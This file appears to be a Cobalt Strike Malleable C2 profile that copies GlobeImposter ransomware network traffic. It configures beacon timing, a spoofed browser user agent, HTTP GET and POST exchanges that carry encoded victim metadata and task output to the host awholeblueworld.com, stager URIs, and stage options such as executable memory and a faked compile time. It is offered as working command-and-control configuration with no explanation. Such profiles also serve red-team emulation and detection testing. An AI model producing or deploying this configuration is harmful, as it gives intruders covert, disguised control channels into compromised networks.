#GlobeImposter ransomware
#taken from --> http://www.malware-traffic-analysis.net/2017/11/30/index.html
#xx0hcd

set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla Firefox/4.0(compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0;SLC2; .NET CLD 3.5.30729; Media Center PC 6.0;)";
set dns_idle "8.8.8.8";
set maxdns    "235";


http-get {
    
    set uri "/JHGcd476334";
    
    client {

	header "Accept" "*/*";
	header "Accept-Encoding" "gzip, deflate";
	header "Host" "awholeblueworld.com";
	header "Connection" "Keep-Alive";
	
        
        metadata {
            base64url;
	    header "Cookie";

        }


    }

    server {

	header "Server" "nginx";
	header "Content-Type" "text/plain";
	header "Connection" "keep-alive";
	header "Vary" "Accept-Encoding";
	header "X-Powered-By" "PleskLin";
	header "Content-Encoding" "gzip";
        

        output {

            netbios;
	    prepend "500a ...............|T..?~.G..a.I H. AQ...J...";
            print;
        }
    }
}

http-post {
    set verb "GET";
    set uri "/count.php";

    client {

	header "Accept" "*/*";
	header "Accept-Encoding" "gzip, deflate";
	header "Host" "awholeblueworld.com";
	header "Connection" "Keep-Alive";
        
        output {
            base64url;
	    parameter "nu";
	    


        }


        id {
            base64url;
	    parameter "fb";

        }

#	parameter "fb" "110";

    }

    server {

	header "Server" "nginx";
	header "Content-Type" "text/plain";
	header "Connection" "keep-alive";
	header "Vary" "Accept-Encoding";
	header "X-Powered-By" "PleskLin";
	header "Content-Encoding" "gzip";
        
        
        output {
            netbios;
	    prepend "500a ...............|T..?~.G..a.I H. AQ...J...";
            print;
        }

    }
}

http-stager {

    set uri_x86 "/JHGCd476334";
    set uri_x64 "/JHGcD476334";


    client {

	header "Host" "awholeblueworld";
	header "Connection" "keep-alive";

    }

    server {

	header "Server" "nginx";
	header "Content-Type" "text/plain";
	header "Connection" "keep-alive";
	header "Vary" "Accept-Encoding";
	header "X-Powered-By" "PleskLin";
	header "Content-Encoding" "gzip";
	

	output {
	   
            print;
	}
    
    }


}

stage {
	set userwx "true";
	set compile_time "03 Feb 2016 09:17:32";
	set image_size_x86 "448012";
	set image_size_x64 "448012";
	#set obfuscate "true";
}
